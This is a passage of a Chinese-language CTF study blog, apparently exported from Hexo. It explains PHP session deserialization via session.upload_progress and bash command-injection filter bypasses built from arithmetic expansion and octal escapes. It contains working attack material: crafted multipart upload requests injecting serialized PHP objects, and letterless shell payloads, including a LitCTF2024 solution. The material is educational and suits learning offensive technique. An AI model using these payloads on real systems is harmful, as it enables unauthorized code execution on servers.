-<h6 id="利用session-upload-progress进行反序列化-方式一"><a href="#利用session-upload-progress进行反序列化-方式一" class="headerlink" title="利用session.upload_progress进行反序列化-方式一"></a>利用session.upload_progress进行反序列化-方式一</h6><p>结合下述Session上传进度，<strong>这个方法需要php≥5.4</strong></p>
-<p><a href="https://bugs.php.net/bug.php?id=71101">漏洞官方说明</a></p>
-<p>这个漏洞条件官方说的挺清楚的，简单说明一下使用这个方法的条件</p>
-<p>条件：</p>
-<ol>
-<li><code>session.upload_progress.enabled = On</code>（是否启用上传进度报告）</li>
-<li><code>session.upload_progress.cleanup = Off</code>（是否上传完成之后删除session文件-这里需要为Off）</li>
-</ol>
-<p>这两个都是可在查的</p>
-<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240423211803946.png" alt="image-20240423211803946"></p>
-<p><strong>当enabled被设置为on时，此时再往服务器中上传一个文件时，PHP会把该文件的详细信息（如上传时间、上传进度等）存储到session，所以上传文件进度的报告就会以写入到session文件中</strong>，所以我们<u>可以设置一个与<code>session.upload_progress.name</code>同名的变量(默认名为<code>PHP_SESSION_UPLOAD_PROGRESS</code>)，PHP检测到这种同名请求会在<code>$_SESSION</code>中添加一条数据</u>。我们就可以控制这个数据内容为我们的恶意payload</p>
-<p><strong>对session上传进度说明一下：</strong></p>
-<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/1647333728_62305160591d530edf695.jpeg" alt="image-20220315161551104"></p>
-<p>但是需要自己构造一个<strong>文件上传表单</strong>，代码如下：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://web.jarvisoj.com:32784/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>，在上传文件(必须上传)时抓包，直接借用官方的说明，有两种改法（第二种待验证）来进行反序：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-POST_RAW--</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------20896060251896012921717172737</span><br><span class="line">-----------------------------20896060251896012921717172737</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHPSESSID&quot;</span><br><span class="line"></span><br><span class="line">session-data-injection</span><br><span class="line">-----------------------------20896060251896012921717172737</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line"></span><br><span class="line">|xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxO:3:&quot;obj&quot;:0:&#123;&#125;</span><br><span class="line">-----------------------------20896060251896012921717172737</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;file.txt&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">-----------------------------20896060251896012921717172737--</span><br></pre></td></tr></table></figure>
-
-<p>第一个就是上述官方改法，还有一个是在<a href="https://www.freebuf.com/articles/web/324943.html">文章</a>里看到可以改将filename那个file.txt改成payload(文章基本都是这样改的，在值里面改肯能会应该出现|导致数据写入session失败)</p>
-<p><strong>但是文件名需要注意防止引号被转义同时也是为了防止与最外层的双引号冲突</strong>，需要使用\来说明，借用文章代码说明一下（待验证-还是很多文章都在用这种改法）：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----------------------------23899461075638356511525184357</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line"></span><br><span class="line">123</span><br><span class="line">-----------------------------23899461075638356511525184357</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">123</span><br><span class="line">-----------------------------23899461075638356511525184357--</span><br></pre></td></tr></table></figure>
-
-<p><strong>上传成功就可以直接在Index.php页面利用这个payload</strong></p>
-<h6 id="利用session-upload-progress进行反序列化-方式二"><a href="#利用session-upload-progress进行反序列化-方式二" class="headerlink" title="利用session.upload_progress进行反序列化-方式二"></a>利用session.upload_progress进行反序列化-方式二</h6><p><strong>同样需要php≥5.4</strong></p>
-<p>这个方法着重于解决当配置如下使如何解决,一般这个是php.ini的默认项：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. session.upload_progress.enabled = on</span><br><span class="line">2. session.upload_progress.cleanup = on</span><br><span class="line">3. session.upload_progress.prefix = &quot;upload_progress_&quot;</span><br><span class="line">4. session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line">5. session.upload_progress.freq = &quot;1%&quot;</span><br><span class="line">6. session.upload_progress.min_freq = &quot;1&quot;</span><br></pre></td></tr></table></figure>
-
-<p>这里与上面的最主要的区别就是<code>session.upload_progress.cleanup = on</code>，<u>表示当文件上传结束后，php将会立即清空对应session文件中的内容</u>，也就代表我们每次<strong>正常访问</strong>session文件时都是<strong>空文件</strong>。所以想要利用就需要竞争。</p>
-<p><strong>如果cleanup被设置为On，就需要使用条件竞争</strong></p>
-<p>&#x3D;&#x3D;还有一个比较重要的配置：&#x3D;&#x3D;<br><code>session.use_strict_mode=off</code>，这个选项默认值为off，表示我们对cookie中的sessionid可控。这一点很重要。</p>
-<p>开始解析：</p>
-<ul>
-<li>配置文件中的<code>session.use_strict_mode</code>默认为0时，这个情况下，用户可以定义自己的sessionid，例如当用户在cookie中设置<code>sessionid=Lxxx</code>时，PHP就会生成一个文件<code>/tmp/sess_Lxxx</code>，此时也就初始化了session，并且会将上传的文件信息写入到文件<code>/tmp/sess_Lxxx</code>中去。</li>
-<li>由于<strong>在这种情况下cleanup的值为on</strong>，所以文件上传成功后文件内容会马上被清空，此时就需要利用Python的多线程来条件竞争</li>
-</ul>
-<p>脚本后面补，遇到题再搓出来。</p>
-<p>参考文章:<code>https://www.freebuf.com/vuls/202819.html</code></p>
-<p>其他例题参考：<br>1.简单过程说明以及其他ctf题解<a href="https://xz.aliyun.com/t/6640?time__1311=n4+xnD0DRDBGitN4q05+bDyiDumxc7l1lZZYD&alichlgref=https://cn.bing.com/#toc-9">文章</a></p>
-]]></content>
-      <categories>
-        <category>php相关漏洞</category>
-        <category>php反序列化</category>
-        <category>session反序列化</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>rce之利用shell变量</title>
-    <url>/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/</url>
-    <content><![CDATA[<h3 id="rce-‘新’进阶"><a href="#rce-‘新’进阶" class="headerlink" title="rce ‘新’进阶"></a>rce ‘新’进阶</h3><p>现在稍微大型的比赛都不会考那些已经算是比较常见、常用、简单的绕过如简单的取反、自增等，需要进阶学习纪录一下。此为学习者笔记,还是<strong>强调知识点融会贯通</strong></p>
-<span id="more"></span>
-
-<h3 id="命令执行之构造数字"><a href="#命令执行之构造数字" class="headerlink" title="命令执行之构造数字"></a>命令执行之构造数字</h3><h5 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h5><p><strong>在linux中<code>$(())</code>用于算术运算</strong>，在这个表达式中，你可以放入任何想要计算的运算式。</p>
-<p>先看下面这个式子：</p>
-<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602213327932.png" alt="image-20240602213327932"></p>
-<p>这个式子中并没有给出任何具体的运算内容，系统默认执行了一个空的算数运算。所以在没有明确运算目标的情况下，**<code>$(())</code>返回的默认值是0**。（同时注意，个人认为，注意看payload以及执行情况，<code>$(())</code>本生就会执行后返回结果，不需要套一个<code>eval()</code>这种类似的执行函数）</p>
-<p>看看给了的正常的运算符</p>
-<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602214355554.png" alt="image-20240602214355554"></p>
-<p>重点来了，尝试将上面那个0取反<br><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602214522539.png" alt="image-20240602214522539"></p>
-<p>得到-1，那么再取反一次<code>-2</code>看看<br><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602214739811.png" alt="image-20240602214739811"></p>
-<p>这里又得到了1，linux中的取反操作时针对二进制进行的，那么现在就可以通过相加减获得数字。</p>
-<p>比如想要获得1，就可以像上面一样构造，如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $((~$(($((~$(())))+$((~$(())))))))</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602215641095.png" alt="image-20240602215641095"></p>
-<p>现在想要构造就很简单了，比如又想构造<code>2</code>：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $(($((~$(($((~$(())))+$((~$(())))))))+$((~$(($((~$(())))+$((~$(())))))))))</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602215758986.png" alt="image-20240602215758986"></p>
-<p>这样就可以构造任意数字。</p>
-<p><strong>同时注意加号在某些情况下可以省略</strong>（建议在去掉+号前先看看没去+号是什么样子的），比如那个生成1的payload</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原：</span><br><span class="line">echo $((~$(($((~$(())))+$((~$(())))))))</span><br><span class="line"></span><br><span class="line">去掉+号后</span><br><span class="line">echo $((~$(($((~$(())))$((~$(())))))))  如下图</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602222226786.png" alt="image-20240602222226786"></p>
-<p>成功执行。</p>
-<p>但是注意，为什么要加某些情况下呢，比如下面这个测试：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $(($((~$(($((~$(())))+$((~$(())))))))+$((~$(($((~$(())))+$((~$(())))))))))</span><br><span class="line">生成2的payload，那么现在将+去掉，如下：</span><br><span class="line">echo $(($((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))))))))</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602222408309.png" alt="image-20240602222408309"></p>
-<p>这里生成的却是11，嘿嘿，这是怎么回事，注意看这个payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$(($((~$(($((~$(())))+$((~$(())))))))+$((~$(($((~$(())))+$((~$(())))))))))</span><br><span class="line"></span><br><span class="line">先像上面那个1那样只去掉构造出1的+号，再看看执行结果，如下：</span><br><span class="line">$(($((~$(($((~$(())))$((~$(())))))))+$((~$(($((~$(())))$((~$(())))))))))</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602222634293.png" alt="image-20240602222634293"></p>
-<p>成功得到2，那么为什么将中间那个<code>+</code>去掉就不对了呢，个人认为是符号判定的问题，用代码表示一下去掉<code>+</code>后的情况：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$(( $((~$(($((~$(())))$((~$(()))))))) $((~$(($((~$(())))$((~$(()))))))) ))</span><br></pre></td></tr></table></figure>
-
-<p>用空格分隔了一下，注意看</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$((~$(($((~$(())))$((~$(())))))))  已经符合一个完整的格式，会得到1，那么两个1就会得到11，这就是为什么可以得到11的原因</span><br></pre></td></tr></table></figure>
-
-<p>那么现在来和之前生成1的payload对比一下（同样用空格分隔）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$(( ~$(($((~$(()))) $((~$(()))))) ))</span><br></pre></td></tr></table></figure>
-
-<p>这样并不能形成一个完整的可计算的格式，故只能类似之前那样有个<code>+</code>，所以这里的<code>+</code>号可以省略，而那个2不能。</p>
-<p><strong>那么如果遇到过滤<code>+</code>号的题</strong>，2该如何构造呢，注意看：</p>
-<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602223600280.png" alt="image-20240602223600280"></p>
-<p>尝试一下构造<code>-3</code>，如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1: $((~$(())))</span><br><span class="line"></span><br><span class="line">echo $((~$(($((~$(())))+$((~$(())))+$((~$(())))))))</span><br><span class="line">可以直接得到2，看了一下构造，应该是可以去掉+号的，尝试一下：</span><br><span class="line">echo $((~$(($((~$(())))$((~$(())))$((~$(()))))))) ,成功</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602223942848.png" alt="image-20240602223942848"></p>
-<p>多尝试，看构造，较重要</p>
-<h5 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h5><p>LitCTF2024 - 百万美元的诱惑</p>
-<p>开题：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span> !== <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$c</span>) &amp;&amp; <span class="variable">$c</span> &gt; <span class="number">2024</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;好康的&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;干巴爹干巴爹先辈~&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;开胃小菜))&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>简单的绕过，payload如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a[]=1&amp;b[]=2&amp;c=2025a</span><br></pre></td></tr></table></figure>
-
-<p>然后给了第二关<code>/dollar.php</code>，代码如下：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in 12.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$x</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z0-9;`|#&#x27;\&quot;%&amp;\x09\x0a&gt;&lt;.,?*\-=\\[\]]/i&quot;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat &quot;</span>.<span class="variable">$x</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
-
-<p>正好对应这个知识点，构造如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-13取反为12</span><br><span class="line"></span><br><span class="line">$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure>
-
-<p>直接抓包后传进去即可</p>
-<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240610184944008.png" alt="image-20240610184944008"></p>
-<h3 id="利用shell脚本变量构造命令"><a href="#利用shell脚本变量构造命令" class="headerlink" title="利用shell脚本变量构造命令"></a>利用shell脚本变量构造命令</h3><p>这个思路最早提出于2017年34c3CTF里的<a href="https://medium.com/@orik_/34c3-ctf-minbashmaxfun-writeup-4470b596df60">minbashmaxfun</a>，随后2020安洵杯也有<a href="https://xz.aliyun.com/t/12242?time__1311=mqmhD5YIMD7GkDlc+EvPQqOQbDkDfg2TD&alichlgref=https://www.bing.com/#toc-2">Web-Bash-Vino0o0o</a></p>
-<p><strong>探姬师傅有个项目应该是可以尝试一把梭的</strong>，好文好项目推送：<code>https://github.com/ProbiusOfficial/bashFuck?tab=readme-ov-file</code></p>
-<p>还有bash的参考手册：<code>https://www.gnu.org/software/bash/manual/bash.html</code></p>
-<h4 id="启程"><a href="#启程" class="headerlink" title="启程"></a>启程</h4><p>这一板块去跟一下最早的<a href="https://medium.com/@orik_/34c3-ctf-minbashmaxfun-writeup-4470b596df60">文章</a>。</p>
-<p><strong>这道题允许的字符串<code>$()#!&#123;&#125;&lt;\’,</code></strong></p>
-<p>这里说明一下相关变量：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">（1）$# -参数数量-单独使用结果为0</span><br><span class="line">（2）$&#123;##&#125; -计数变量（#）长度，这里的结果为1</span><br><span class="line">（3）$((expr)) -算术表达式</span><br><span class="line">（4）&lt;&lt;&lt; -这是Bash shell语言中的重定向符，将一个变量或者字符串重定向到命令的标准输入（即wc -w &lt;&lt;&lt; &quot;H&quot;等价于echo &quot;H&quot; | wc -w）</span><br><span class="line">（5）$&#123;!var&#125; -间接引用</span><br><span class="line">（6）$&#x27;\123&#x27; -将八进制转换为字符串文字中的字符</span><br><span class="line">（7）&#123;a,b&#125; -花括号扩展</span><br></pre></td></tr></table></figure>
-
-<p><strong>这里补充说明一下</strong>：</p>
-<ul>
-<li>对（5）的间接引用的说明，直接给shell测试代码：</li>
-</ul>
-<p>haha.sh:</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">var1=&quot;hello&quot;</span><br><span class="line">var2=&quot;var1&quot;</span><br><span class="line">echo $&#123;!var2&#125;</span><br></pre></td></tr></table></figure>
-
-<p>再运行：</p>
-<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603023300478.png" alt="image-20240603023300478"></p>
-<p>可以看到这里输出的是hello，这就是间接引用的定义。</p>
-<ul>
-<li>对（6）的补充说明，如下：</li>
-</ul>
-<p>一个小小的前置知识，看完理解一下就行。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls ==》 $&#x27;\154&#x27;$&#x27;\163&#x27; 这样是可以直接使用的</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603153444204.png" alt="image-20240603153444204"></p>
-<p>就是<code>$&#39;&#39;</code>会直接执行生成，所以交给编译器的是ls，也就会执行。</p>
-<p><strong>再进行组合运用一下：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$(($&#123;##&#125;&lt;&lt;$&#123;##&#125;)) - 1左移1，结果为2 位运算，与二进制的运算相关</span><br><span class="line">$&#123;!#&#125; - 执行 bash（因为第一个参数是 /bin/bash），可以在本地输出看看</span><br><span class="line">$((2#100)) -将二进制转换为十进制</span><br></pre></td></tr></table></figure>
-
-
-
-<h5 id="开始构造"><a href="#开始构造" class="headerlink" title="开始构造"></a>开始构造</h5><p>先尝试<code>ls</code>，**<code>l</code>对应八进制为0154，<code>s</code>对应的八进制为0163。**</p>
-<p><strong>先用八进制表示，<code>$&#39;\154&#39;$&#39;\163&#39;</code>,个人发现<code>$&#39;\154\163&#39;</code>也可以表示<code>ls</code>，</strong>这里先跟文章，然后再尝试自己构造发现的同样表示ls的方法。</p>
-<p>注意组合运用那里<code>$((2#100))</code>可以将二进制100转换为十进制数4，采用这个思路来构造出整数，</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">154二进制数 : 0b10011010</span><br><span class="line">163二进制数 : 0b10100011</span><br></pre></td></tr></table></figure>
-
-<p>那么现在就用<code>$#</code>（0）和<code>$</code>（1）来替换里面的数字，如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">154二进制数 ：$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#</span><br><span class="line">163二进制数 ：$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这样就可以构造出二进制的数。</p>
-<p>那么此时就需要构造出前面的2，<strong>此时再看组合运用那里</strong>，<code>$(($&lt;&lt;$))</code>这样不就构造出2了吗，最终效果如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">154：$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))</span><br><span class="line">同理</span><br><span class="line">163：$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))</span><br></pre></td></tr></table></figure>
-
-<p>这时再套入<code>$&#39;&#39;</code>，即（<code>$&#39;\154&#39;$&#39;\163&#39;</code>），如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先看正常包裹：</span><br><span class="line">$&#x27;\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))&#x27;$&#x27;\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))&#x27;</span><br><span class="line">这样并不能成功，请注意。估计就是套外面的特殊符号被当作字符串从而转义了，这里就需要在特殊符号前面加一个\防止被转义。</span><br><span class="line">那么再次尝试如下：</span><br><span class="line">\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))\&#x27;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))\&#x27;</span><br><span class="line">输出看看</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603125450576.png" alt="image-20240603125450576"></p>
-<p>但是注意，这个构造出来的<code>$&#39;\154&#39;$&#39;\163&#39;</code><strong>只会被当做字符串，并不会被当作命令执行再次执行从而形成ls</strong>，也就是说这里的<code>$&#39;&#39;</code>并没有起作用，本来它可以自己执行从而生成ls的，为什么不继续解析可以看看这个<a href="https://www.freebuf.com/articles/system/361101.html">文章</a>，可以在终端直接传，结果如下：<br><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603125825756.png" alt="image-20240603125825756"></p>
-<p>显示没有这个命令，那么此时我们就需要将这个传入bash使得这个被解析为<code>ls</code>，<strong>这次就可以利用到<code>&lt;&lt;&lt;</code>这个重定向符</strong>，如下格式：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash &lt;&lt;&lt; \$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))\&#x27;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))\&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>这样就可以成功构造出ls，再传入的时候就可以被执行，但是这道题这里要求无字母，此时就<strong>可以用到间接扩展<code>$0</code>，单独使用在linux中对应bash</strong>，但是这道题不能有数字，看组合运用那里，就可以像这样：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;!#&#125; &lt;&lt;&lt; \$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))\&#x27;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))\&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>很怪的就是本地测试当中<code>bash&lt;&lt;&lt;.....</code>可以执行，但是<code>$0</code>和<code>$&#123;!#&#125;</code>都不能成功执行，报错如下：</p>
-<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603135658082.png" alt="image-20240603135658082"></p>
-<p><strong>怪？？？，怎么回事，可能是宝塔linux环境的问题吧，多尝试，注意看题目要求。</strong></p>
-<p>这里再用centos跑一下：</p>
-<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603204933409.png" alt="image-20240603204933409"></p>
-<p>成功，这样就可以构造出没有数字字母的<code>ls</code>的payload了。</p>
-<p><strong>那么继续深入</strong>，比如读flag（<code>cat /flag</code>）或者查看根目录（<code>ls /</code>），<strong>尝试直接利用</strong>一下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls / ==&gt; $&#x27;\154\163\40\57&#x27;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603141433189.png" alt="image-20240603141433189"></p>
-<p>注意看，这里构造出来后被<code>ls /</code>被当作了整个字符串处理，而不是命令，这是怎么回事，<strong>这是因为<code>bash</code>是用空格分隔参数，这个方法（<code>$&#39;&#39;</code>）处理完的结果会导致整个结果都被当做了字符串（包括这里的空格）</strong>，这就导致了不能被正常解析为命令。解决方法如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">要先给bash来参数分离一下，</span><br><span class="line">bash &lt;&lt;&lt; $&#x27;\154\163\40\57&#x27;   </span><br><span class="line">即可成功执行，还有问题的话就如这种格式尝试&#123;ls,/&#125;，注意&#123;ls,/&#125;也不能像之前ls那样直接利用，与ls /同样的问题。</span><br></pre></td></tr></table></figure>
-
-
-
-<p><strong>再来看看文章的问题</strong></p>
-<p>在传入时有效的做到了以下几点：</p>
